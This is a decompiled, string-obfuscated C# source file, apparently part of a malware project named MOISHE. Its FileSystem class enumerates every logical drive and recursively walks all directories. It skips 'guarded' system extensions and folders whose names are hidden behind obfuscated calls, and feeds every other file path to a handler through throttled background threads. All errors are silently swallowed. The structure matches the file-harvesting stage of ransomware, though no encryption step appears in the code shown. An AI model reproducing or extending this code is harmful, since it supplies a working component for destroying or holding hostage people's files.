using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using _003CPrivateImplementationDetails_003E_007B18A11B1C_002D3AA7_002D4357_002DAAD9_002DCC83BB5216E3_007D;

namespace MOISHE.Core;

public class FileSystem
{
	[CompilerGenerated]
	private sealed class A
	{
		public List<string> A;

		public BlockingCollection<string> A;

		public RecursorItemSubmittedHandler A;

		public List<FileInfo> A;

		internal void A()
		{
			try
			{
				foreach (FileInfo item in this.A)
				{
					string fullName = item.FullName;
					try
					{
						if (!FileSystem.A(fullName, this.A))
						{
							this.A.Add(fullName);
							Console.WriteLine(Class0.bK() + fullName);
							if (this.A != null)
							{
								this.A(fullName);
							}
						}
					}
					catch
					{
					}
				}
			}
			finally
			{
				FileSystem.m_A.Take();
			}
		}
	}

	private static string[] m_A = new string[7]
	{
		Class0.J(),
		Class0.i(),
		Class0.k(),
		Class0.j(),
		Class0.K(),
		Class0.H(),
		Class0.h()
	};

	private static string[] a = new string[2]
	{
		Class0.ak(),
		Class0.aL()
	};

	private static BlockingCollection<Thread> m_A = new BlockingCollection<Thread>(new ConcurrentQueue<Thread>(), 10);

	public static bool IsGuarded(FileInfo file)
	{
		string name = file.Name;
		int num = 0;
		while (true)
		{
			if (num < FileSystem.m_A.Length)
			{
				if (name.EndsWith(FileSystem.m_A[num]))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public static bool IsGuarded(DirectoryInfo file)
	{
		string name = file.Name;
		int num = 0;
		while (true)
		{
			if (num < FileSystem.m_A.Length)
			{
				if (name.EndsWith(FileSystem.m_A[num]))
				{
					break;
				}
				num++;
				continue;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < a.Length)
				{
					if (name == a[num2])
					{
						break;
					}
					num2++;
					continue;
				}
				return false;
			}
			return true;
		}
		return true;
	}

	public static List<DirectoryInfo> EnumerateSubDirectories(DirectoryInfo root)
	{
		List<DirectoryInfo> list = new List<DirectoryInfo>();
		try
		{
			foreach (DirectoryInfo item in root.EnumerateDirectories())
			{
				if (!IsGuarded(item))
				{
					list.Add(item);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static List<FileInfo> EnumerateFiles(DirectoryInfo root)
	{
		List<FileInfo> list = new List<FileInfo>();
		try
		{
			foreach (FileInfo item in root.EnumerateFiles())
			{
				if (!IsGuarded(item))
				{
					list.Add(item);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static List<DirectoryInfo> EnumerateRoots()
	{
		string[] logicalDrives = System.IO.Directory.GetLogicalDrives();
		List<DirectoryInfo> list = new List<DirectoryInfo>();
		string[] array = logicalDrives;
		foreach (string path in array)
		{
			list.Add(new DirectoryInfo(path));
		}
		return list;
	}

	public static DirectoryInfo Directory(string path)
	{
		return new DirectoryInfo(path);
	}

	public static FileInfo File(string path)
	{
		return new FileInfo(path);
	}

	public static bool IsDirectory(string path)
	{
		try
		{
			return new DirectoryInfo(path).Exists;
		}
		catch
		{
		}
		return false;
	}

	private static bool A(string string_0, List<string> list_0)
	{
		foreach (string item in list_0)
		{
			if (!string_0.ToLower().Equals(item.ToLower()))
			{
				if (!string_0.ToLower().EndsWith(item.ToLower()))
				{
					if (!string_0.ToLower().StartsWith(item.ToLower()))
					{
						if (string_0.ToLower().Contains(item.ToLower()))
						{
							return true;
						}
						continue;
					}
					return true;
				}
				return true;
			}
			return true;
		}
		return false;
	}

	public static void RecursePathSync(string path, BlockingCollection<string> sink, RecursorItemSubmittedHandler handler)
	{
		if (IsDirectory(path))
		{
			DirectoryInfo directoryInfo = Directory(path);
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				string fullName = item.FullName;
				sink.Add(fullName);
				handler?.Invoke(fullName);
			}
			{
				foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories())
				{
					try
					{
						RecursePathSync(item2.FullName, sink, handler);
					}
					catch
					{
					}
				}
				return;
			}
		}
		string fullName2 = File(path).FullName;
		sink.Add(fullName2);
		handler?.Invoke(fullName2);
	}

	public static void RecursePath(string path, List<string> protection, BlockingCollection<string> sink, RecursorItemSubmittedHandler handler)
	{
		if (!IsDirectory(path))
		{
			return;
		}
		try
		{
			List<FileInfo> A = EnumerateFiles(Directory(path));
			if (A != null && A.Count > 0 && sink != null)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						foreach (FileInfo item in A)
						{
							string fullName = item.FullName;
							try
							{
								if (!FileSystem.A(fullName, protection))
								{
									sink.Add(fullName);
									Console.WriteLine(Class0.bK() + fullName);
									if (handler != null)
									{
										handler(fullName);
									}
								}
							}
							catch
							{
							}
						}
					}
					finally
					{
						FileSystem.m_A.Take();
					}
				});
				thread.IsBackground = true;
				thread.Priority = ThreadPriority.BelowNormal;
				FileSystem.m_A.Add(thread);
				thread.Start();
			}
		}
		catch
		{
		}
		foreach (DirectoryInfo item2 in EnumerateSubDirectories(Directory(path)))
		{
			try
			{
				RecursePath(item2.FullName, protection, sink, handler);
			}
			catch
			{
			}
		}
	}
}
